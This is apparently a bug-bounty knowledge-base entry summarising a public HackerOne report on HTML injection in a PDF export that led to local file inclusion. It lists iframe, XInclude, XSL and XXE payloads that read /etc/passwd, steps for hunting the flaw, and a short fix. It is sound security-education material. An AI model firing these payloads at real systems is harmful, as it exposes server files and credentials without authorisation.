---
name: lfi-html-injection-pdf
description: HTML injection in a PDF/report export feature leading to LFI — injected markup is rendered by a templating engine that can include local files. Teaches abusing PDF/doc generators for SSRF/LFI.
sources: hackerone_public
report_count: 1
---

# HTML injection in PDF export → LFI

**Report**: Visma — "HTML-injection in PDF-export leads to LFI" (hackerone.com/reports/809819, $500).

## Why it matters (the new lesson)
PDF/report/doc generators render attacker-influenced HTML/XML server-side using a templating engine (wkhtmltopdf, PhantomJS, Apache FOP, iText, XSL-FO, Thymeleaf). Injected markup can often `include`/`import` local files or fetch URLs — turning a "low" HTML injection into LFI/SSRF. The sink isn't the browser; it's the server-side renderer.

## How it works
Inject into the exported field:
```html
<iframe src="file:///etc/passwd"></iframe>
<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///etc/passwd"/>
<xsl:include href="file:///etc/passwd"/>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```
The rendered PDF contains the file contents (or the server fetches your URL).

## How to hunt for it
1. Find "export to PDF/CSV/report/quote/invoice" features with user text.
2. Inject HTML/XML tags and XInclude/entity markup.
3. Test `file://`, `http://` (Collaborator), `php://`, `jar:`.
4. Read the generated file/PDF for leaked content.

## Payloads
```
<iframe src="file:///etc/passwd">
<xi:include parse="text" href="file:///etc/passwd"/>
<svg onload="..."> (if JS engine)
```

## Fix
Treat exported content as data, not markup; disable external entities/XInclude/remote file access in the renderer; sandbox the generator.
